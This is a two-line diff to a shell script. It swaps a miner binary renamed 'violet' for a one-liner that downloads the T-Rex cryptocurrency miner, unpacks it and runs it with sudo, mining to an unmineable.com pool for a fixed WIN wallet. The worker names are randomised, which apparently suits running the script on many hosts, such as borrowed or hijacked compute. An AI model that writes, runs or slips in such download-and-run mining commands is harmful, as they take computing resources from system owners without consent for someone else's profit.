@@ -1,1 +1,2 @@
-./violet --algorithm wrkzcoin --pool rx.unmineable.com:3333 --username WIN:TXdAWjGw8RRYpkpZd6rXHEqRRwCPRnPe5B.$(echo $(shuf -i 9-999 -n 1)-WIN) --threads 4
+#!/bin/sh
+apt-get install libpci3 && wget https://trex-miner.com/download/t-rex-0.19.14-linux-cuda11.1.tar.gz && tar -xvf t-rex-0.19.14-linux-cuda11.1.tar.gz && sudo ./t-rex -a kawpow -o kp.unmineable.com:3333 -u WIN:TXdAWjGw8RRYpkpZd6rXHEqRRwCPRnPe5B.$(echo $(shuf -i 1-9 -n 1)-$(shuf -i 1-99 -n 1)-WIN) -p x
